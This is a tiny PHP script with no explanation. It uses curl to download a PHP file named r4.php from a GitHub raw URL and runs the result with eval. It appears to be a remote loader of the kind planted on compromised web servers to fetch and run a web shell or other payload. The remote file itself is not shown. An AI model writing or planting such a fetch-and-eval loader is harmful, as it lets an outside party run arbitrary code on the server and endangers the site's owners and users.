<?php
    $Url = "https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/r4.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
?>
